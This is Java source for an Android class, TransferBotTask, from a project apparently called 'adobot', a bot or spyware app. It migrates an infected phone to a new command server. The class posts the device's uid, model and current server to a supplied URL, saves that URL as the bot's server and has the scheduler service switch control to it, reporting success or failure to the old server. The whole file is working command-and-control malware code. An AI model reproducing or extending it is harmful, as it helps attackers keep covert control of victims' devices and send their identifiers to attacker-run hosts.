package com.android.adobot.tasks;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.util.Log;

import com.android.adobot.AdobotConstants;
import com.android.adobot.http.Http;
import com.android.adobot.http.HttpCallback;
import com.android.adobot.http.HttpRequest;
import com.android.adobot.NetworkSchedulerService;

import java.util.HashMap;

/**
 * Created by adones on 2/26/17.
 */

public class TransferBotTask extends BaseTask {

    private static final String TAG = "TransferBotTask";

    private String newServerUrl;
    private Context commandService;
    SharedPreferences prefs;

    public TransferBotTask(Context c, String url) {
        setContext(c);
        this.commandService = c;
        this.newServerUrl = url;
    }

    private HttpCallback pingCb = new HttpCallback() {
        @Override
        public void onResponse(HashMap response) {
            int statusCode = Integer.parseInt(String.valueOf(response.get("status")));
            Log.i(TAG, "Ping call back!!! Status code: " + statusCode);
            HashMap p = new HashMap();
            p.put("uid", commonParams.getUid());
            p.put("device", commonParams.getDevice());
            p.put("server", newServerUrl);
            p.put("status", statusCode);
            if (statusCode >= 200 && statusCode < 400) {
//                new server is reachable
//                notify old server
                sendNotification("transferbot:success", p);
                prefs = context.getSharedPreferences(AdobotConstants.PACKAGE_NAME, Context.MODE_PRIVATE);
                boolean saved = prefs.edit().putString(AdobotConstants.PREF_SERVER_URL_FIELD, newServerUrl).commit();
                Log.i(TAG, "Saved: " + (saved? "true" : "false"));
                if (saved && Build.VERSION.SDK_INT >= 21) {
                    NetworkSchedulerService  cmd = (NetworkSchedulerService) commandService;
                    cmd.changeServer(newServerUrl);
                }
                else
                    sendNotification("transferbot:failed", p);
            } else {
                sendNotification("transferbot:failed", p);
            }

        }
    };

    @Override
    public void run() {
        super.run();
        pingNewServer();
    }

    private void pingNewServer() {
        HashMap p = new HashMap();
        p.put("event", "bot:transferring");
        p.put("uid", commonParams.getUid());
        p.put("device", commonParams.getDevice());
        p.put("server", commonParams.getServer());

        //ping server before transferring bot
        Http req = new Http();
        req.setUrl(newServerUrl + AdobotConstants.NOTIFY_URL);
        req.setMethod(HttpRequest.METHOD_POST);
        req.setParams(p);
        req.setCallback(pingCb);
        req.execute();

    }
}
